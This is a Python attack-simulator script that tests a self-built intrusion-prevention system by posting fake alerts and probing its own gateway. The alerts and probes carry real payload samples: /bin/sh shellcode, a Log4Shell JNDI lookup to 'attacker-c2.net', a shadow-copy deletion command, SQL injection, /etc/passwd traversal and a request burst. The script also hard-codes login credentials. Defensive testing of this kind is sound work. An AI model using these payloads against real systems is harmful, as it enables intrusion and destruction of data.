#!/usr/bin/env python3
"""
Apex Sentinel - External System Attack Simulator
=================================================
Run this script from ANY remote computer (Linux, macOS, Windows, Kali)
to launch real attack telemetry and zero-day payloads against Apex Sentinel.

Usage:
  python external_attack_test.py --target 192.168.1.14
  python external_attack_test.py --target 192.168.1.14 --scenario 1
  python external_attack_test.py --target 192.168.1.14 --all
"""

import argparse
import json
import socket
import sys
import time
import urllib.request
import urllib.parse
import urllib.error

ATTACK_SCENARIOS = [
    {
        "id": 1,
        "name": "Novel Zero-Day: Raw Polymorphic Shellcode (Zero Keywords)",
        "desc": "Unlabelled binary stream with high Shannon entropy and raw binary opcodes.",
        "signature": "Raw Ingress Binary Stream [Opaque Execution Vector]",
        "category": "zero_day_rce",
        "severity": "CRITICAL",
        "risk_score": 96,
        "dst_port": 445,
        "protocol": "TCP",
        "raw_event": {
            "payload_hex": "90909031c050682f2f7368682f62696e89e3505389e1b00bcd80eb1f5e89760831c088460789460cb00b89f38d4e088d560ccd80",
            "shannon_entropy": 4.82,
            "byte_variance": 742.1,
            "non_printable_ratio": 0.44
        }
    },
    {
        "id": 2,
        "name": "Apache Log4Shell JNDI Remote Code Execution (CVE-2021-44228)",
        "desc": "Exploits log parsing vulnerabilities with remote LDAP payload execution.",
        "signature": "ET EXPLOIT Apache Log4j JNDI RCE (CVE-2021-44228)",
        "category": "exploit",
        "severity": "CRITICAL",
        "risk_score": 98,
        "dst_port": 443,
        "protocol": "HTTPS",
        "raw_event": {
            "cve": "CVE-2021-44228",
            "jndi_payload": "${jndi:ldap://attacker-c2.net:1389/Exploit}",
            "cvss": 10.0
        }
    },
    {
        "id": 3,
        "name": "Cobalt Strike Malleable Command & Control (C2) Beacon",
        "desc": "Periodic beaconing and jitter communications with malicious external infrastructure.",
        "signature": "ET TROJAN Cobalt Strike Malleable C2 HTTPS Beacon",
        "category": "c2",
        "severity": "CRITICAL",
        "risk_score": 94,
        "dst_port": 443,
        "protocol": "HTTPS",
        "raw_event": {
            "tactic": "Command and Control (T1071.001)",
            "beacon_interval": 60,
            "jitter": 15
        }
    },
    {
        "id": 4,
        "name": "Active Directory Kerberoasting (Ticket Extraction)",
        "desc": "Offline password cracking attempt targeting Service Principal Names (SPN).",
        "signature": "Kerberoasting Active Directory Ticket Request (RC4-HMAC downgrade)",
        "category": "credential_theft",
        "severity": "HIGH",
        "risk_score": 85,
        "dst_port": 88,
        "protocol": "Kerberos",
        "raw_event": {
            "spn": "MSSQLSvc/db-vault.internal:1433",
            "encryption_type": "0x17 (rc4-hmac)"
        }
    },
    {
        "id": 5,
        "name": "LockBit 3.0 Ransomware Volume Shadow Deletion",
        "desc": "Wipes volume shadows and destroys backup recovery pipelines.",
        "signature": "Win32.Ransomware.LockBit3.0 Volume Shadow Deletion via vssadmin",
        "category": "ransomware",
        "severity": "CRITICAL",
        "risk_score": 99,
        "dst_port": 445,
        "protocol": "TCP/SMB",
        "raw_event": {
            "command": "vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No",
            "note": "Restore-My-Files.txt"
        }
    },
    {
        "id": 6,
        "name": "Mirai IoT SYN Flood Distributed Denial of Service",
        "desc": "Volumetric saturation flood targeting ingress edge routing nodes.",
        "signature": "Mirai IoT SYN Flood Distributed Denial of Service (> 1.2M pps)",
        "category": "ddos",
        "severity": "CRITICAL",
        "risk_score": 92,
        "dst_port": 80,
        "protocol": "TCP",
        "raw_event": {
            "pps": 1250000,
            "bandwidth_gbps": 11.2
        }
    }
]


def get_local_ip(target_ip: str) -> str:
    """Determine the IP of this attacking system as reachable by the target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.0)
        s.connect((target_ip, 8000))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.1.99"


def authenticate(base_url: str) -> str:
    """Acquire JWT token from Apex Sentinel."""
    login_url = f"{base_url}/api/auth/login"
    credentials = [
        {"username": "krrish183224@gmail.com", "password": "183@Krrish"},
        {"username": "admin@ids.local", "password": "AdminPassword1!"},
    ]

    for cred in credentials:
        try:
            data = urllib.parse.urlencode(cred).encode("utf-8")
            req = urllib.request.Request(
                login_url,
                data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                if resp.getcode() == 200:
                    payload = json.loads(resp.read().decode("utf-8"))
                    token = payload.get("access_token")
                    if token:
                        return token
        except Exception:
            continue

    raise RuntimeError(f"Authentication failed against {login_url}. Check connectivity & credentials.")


def launch_attack(base_url: str, token: str, scenario: dict, src_ip: str) -> dict:
    """Transmit attack payload to Apex Sentinel ingestion pipeline."""
    alerts_url = f"{base_url}/api/alerts"

    body = {
        "src_ip": src_ip,
        "src_port": 49152,
        "dst_ip": "10.240.0.1",
        "dst_port": scenario["dst_port"],
        "protocol": scenario["protocol"],
        "signature": scenario["signature"],
        "category": scenario["category"],
        "severity": scenario["severity"],
        "risk_score": scenario["risk_score"],
        "status": "OPEN",
        "raw_event": scenario["raw_event"]
    }

    req = urllib.request.Request(
        alerts_url,
        data=json.dumps(body).encode("utf-8"),
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        },
        method="POST"
    )

    t0 = time.time()
    with urllib.request.urlopen(req, timeout=8) as resp:
        duration_ms = (time.time() - t0) * 1000
        res_data = json.loads(resp.read().decode("utf-8"))
        return res_data, duration_ms


# ── HTTP Gateway Layer Attack Tests (IPS Middleware Validation) ────────────────

GATEWAY_EXPLOIT_TESTS = [
    {
        "name": "SQL Injection (In-Line Gateway Intercept)",
        "url_suffix": "/api/health?id=1' UNION SELECT username,password FROM users--",
        "headers": {},
        "desc": "Injects a classic SQLi payload into a query string to trigger the IPS middleware.",
    },
    {
        "name": "Log4Shell JNDI RCE Injection (CVE-2021-44228)",
        "url_suffix": "/api/health",
        "headers": {"X-Api-Version": "${jndi:ldap://attacker-c2.net:1389/Exploit}"},
        "desc": "Sends Log4Shell JNDI payload in a custom HTTP header.",
    },
    {
        "name": "Directory Traversal / LFI",
        "url_suffix": "/api/health?file=../../../../etc/passwd",
        "headers": {},
        "desc": "Attempts a path traversal attack in the query parameter.",
    },
    {
        "name": "Remote Code Execution (Shell Injection)",
        "url_suffix": "/api/health?cmd=vssadmin+delete+shadows+/all+/quiet",
        "headers": {},
        "desc": "Injects a vssadmin (LockBit/Ransomware) command into the query string.",
    },
]


def launch_gateway_exploit(base_url: str, test: dict) -> tuple:
    """Send a raw HTTP request with exploit payload to test IPS middleware interception."""
    url = base_url + test["url_suffix"]
    headers = {"Accept": "application/json", "User-Agent": "ExploitScanner/1.0"}
    headers.update(test.get("headers", {}))

    req = urllib.request.Request(url, headers=headers)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=6) as resp:
            duration_ms = (time.time() - t0) * 1000
            body = json.loads(resp.read().decode("utf-8"))
            return resp.getcode(), body, duration_ms
    except urllib.error.HTTPError as e:
        duration_ms = (time.time() - t0) * 1000
        try:
            body = json.loads(e.read().decode("utf-8"))
        except Exception:
            body = {}
        return e.code, body, duration_ms


def run_gateway_tests(base_url: str):
    """Execute in-line IPS gateway exploit tests and report results."""
    print("\n" + "=" * 72)
    print(">> PHASE 2: IN-LINE IPS GATEWAY EXPLOIT INTERCEPT TESTS")
    print("   These bypass the alert API and hit the HTTP gateway directly.")
    print("   The IPS middleware detects and quarantines on-the-wire!")
    print("=" * 72 + "\n")

    for i, test in enumerate(GATEWAY_EXPLOIT_TESTS, 1):
        print(f"--- [GATEWAY TEST {i}] {test['name']} ---")
        print(f"    Desc   : {test['desc']}")
        print(f"    URL    : {base_url}{test['url_suffix'][:80]}")

        code, body, elapsed = launch_gateway_exploit(base_url, test)

        if code in (403, 429):
            status_icon = "INTERCEPTED"
            verdict = f"HTTP {code} - {body.get('detail', body.get('status', 'BLOCKED'))}"
            print(f"    Result : [BLOCKED] {status_icon}")
        elif code == 200:
            status_icon = "PASSED (check middleware is loaded!)"
            verdict = "HTTP 200 - Request was NOT blocked - verify backend rebuild"
            print(f"    Result : [WARNING] {status_icon}")
        else:
            status_icon = f"HTTP {code}"
            verdict = str(body)[:120]
            print(f"    Result : [?] {status_icon}")

        print(f"    Detail : {verdict}")
        print(f"    Timing : {elapsed:.1f}ms\n")
        time.sleep(1)


def run_flood_test(base_url: str, count: int = 35):
    """Fire rapid burst requests to trigger volumetric DDoS flood detection."""
    print("\n" + "=" * 72)
    print(">> PHASE 3: VOLUMETRIC HTTP FLOOD / DDoS SURGE TEST")
    print(f"   Sending {count} rapid requests to trigger IPS flood threshold (25 req/5s).")
    print("   Watch for 'X' marks when quarantine kicks in!")
    print("=" * 72 + "\n")

    blocked_at = None
    for i in range(1, count + 1):
        try:
            req = urllib.request.Request(
                f"{base_url}/api/health",
                headers={"User-Agent": "PythonFloodTest/1.0"}
            )
            with urllib.request.urlopen(req, timeout=3):
                print(".", end="", flush=True)
        except urllib.error.HTTPError as e:
            if e.code in (429, 403):
                print("X", end="", flush=True)
                if blocked_at is None:
                    blocked_at = i
            else:
                print(f"[{e.code}]", end="", flush=True)
        except Exception:
            print("?", end="", flush=True)

    print("\n")
    if blocked_at:
        print(f"[RATE LIMITED] IP quarantined after request #{blocked_at}! (Threshold: 25 req/5s)")
        print("[+] Check the dashboard: IPS Blocklist will show your IP as AUTO_BLOCKED!")
    else:
        print("[!] All requests succeeded. Increase count or check middleware.")



def main():
    parser = argparse.ArgumentParser(description="Apex Sentinel External System Attack Simulator")
    parser.add_argument("--target", default="192.168.1.14", help="IP address of the Apex Sentinel host machine")
    parser.add_argument("--port", default=8000, type=int, help="Backend API port (default: 8000)")
    parser.add_argument("--scenario", type=int, help="Scenario ID (1-6) to execute directly")
    parser.add_argument("--all", action="store_true", help="Execute all attack scenarios in sequence")
    parser.add_argument("--src-ip", help="Override source IP (default: autodetected local IP)")
    args = parser.parse_args()

    base_url = f"http://{args.target}:{args.port}"
    src_ip = args.src_ip or get_local_ip(args.target)

    print("=" * 72)
    print("  APEX SENTINEL: REMOTE ATTACK & REAL-TIME IPS EVALUATION SUITE")
    print("=" * 72)
    print(f"[*] Attacking System IP : {src_ip}")
    print(f"[*] Target IDS/IPS Host : {base_url}")
    print(f"[*] SOC Dashboard URL   : http://{args.target}:3000")
    print("-" * 72)

    # Health check
    try:
        req = urllib.request.Request(f"{base_url}/api/health", headers={"Accept": "application/json"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            print("[+] Connection Established: Apex Sentinel target is ONLINE!")
    except Exception as e:
        print(f"[-] Connection FAILED to {base_url}/api/health: {e}")
        print("[!] Troubleshooting Tips:")
        print(f"    1. Verify both machines are on the same Wi-Fi / LAN network.")
        print(f"    2. On the target Windows PC, verify firewall allows port {args.port}:")
        print("       New-NetFirewallRule -DisplayName 'IDS_API' -Direction Inbound -LocalPort 8000,3000 -Protocol TCP -Action Allow")
        sys.exit(1)

    # Authenticate
    try:
        print("[*] Authenticating with platform...")
        token = authenticate(base_url)
        print("[+] Authentication Successful! Received signed JWT session.")
    except Exception as e:
        print(f"[-] Authentication failed: {e}")
        sys.exit(1)

    print("-" * 72)

    scenarios_to_run = []
    if args.scenario:
        scenarios_to_run = [s for s in ATTACK_SCENARIOS if s["id"] == args.scenario]
        if not scenarios_to_run:
            print(f"[-] Scenario {args.scenario} not found. Available: 1-6.")
            sys.exit(1)
    elif args.all:
        scenarios_to_run = ATTACK_SCENARIOS
    else:
        print("Available Attack Vectors:")
        for s in ATTACK_SCENARIOS:
            print(f"  [{s['id']}] {s['name']} (Severity: {s['severity']}, Risk: {s['risk_score']})")
        print("  [7] Run Full Multi-Vector Campaign (All 6 scenarios)")
        print()
        choice = input("Enter choice (1-7) [default: 1]: ").strip() or "1"
        if choice == "7":
            scenarios_to_run = ATTACK_SCENARIOS
        else:
            try:
                c_id = int(choice)
                scenarios_to_run = [s for s in ATTACK_SCENARIOS if s["id"] == c_id]
            except ValueError:
                scenarios_to_run = [ATTACK_SCENARIOS[0]]

    print("\n" + "=" * 72)
    print(">> INITIATING REAL-TIME THREAT INJECTION...")
    print("   Watch the dashboard at http://" + args.target + ":3000 to observe live response!")
    print("=" * 72 + "\n")

    for s in scenarios_to_run:
        print(f"\n--- [ATTACK SCENARIO {s['id']}] {s['name']} ---")
        print(f"    Vector Target : :{s['dst_port']} ({s['protocol']}) | Source: {src_ip}")
        print(f"    Signature     : {s['signature']}")
        print(f"    Severity      : {s['severity']} | Risk Score: {s['risk_score']}/100")

        try:
            res, elapsed = launch_attack(base_url, token, s, src_ip)
            alert = res.get("alert", {})
            ai = res.get("ai_evaluation", {})
            mit = res.get("autonomous_mitigation", {})

            print(f"    [+] Ingested & Evaluated in {elapsed:.1f}ms (HTTP 201 Created)")
            print(f"    [+] Alert ID       : {alert.get('id')}")
            print(f"    [+] AI Verdict     : {ai.get('attack_family', 'EVALUATED')} (Anomaly: {ai.get('anomaly_score', 'N/A')})")
            print(f"    [+] Recommended    : {ai.get('recommended_action', 'MONITOR')}")

            if mit.get("prevented"):
                print(f"    [🛑 AUTONOMOUS IPS] ATTACK SEVERED! IP {src_ip} FIREWALL DROPPED! (MTTC: {mit.get('mttc')})")
                print(f"    [+] Status         : AUTO_BLOCKED (Active Quarantine)")
            else:
                print(f"    [+] Status         : {alert.get('status')} (Monitored)")

            print(f"    [📡 BROADCAST] Broadcasted to WebSocket Live Stream & Redis pub/sub!")

        except Exception as e:
            print(f"    [-] Attack transmission error: {e}")

        if len(scenarios_to_run) > 1:
            time.sleep(2)

    print("\n" + "=" * 72)
    print(">> ATTACK SEQUENCE COMPLETED! Phases 2 & 3 starting...")
    print("=" * 72)

    # Phase 2: In-line IPS gateway exploit intercept tests
    run_gateway_tests(base_url)

    # Phase 3: Volumetric flood test
    run_flood_test(base_url)

    print("\n" + "=" * 72)
    print(">> ALL PHASES COMPLETE!")
    print("   Open your browser to inspect the immediate detection and mitigation:")
    print(f"   - SOC Command Dashboard : http://{args.target}:3000/")
    print(f"   - Real-time Threat Alerts: http://{args.target}:3000/alerts")
    print(f"   - Active IPS Blocklist  : http://{args.target}:3000/ips-actions")
    print(f"   - Synthesized Rules     : http://{args.target}:3000/rules")
    print("=" * 72)


if __name__ == "__main__":
    main()
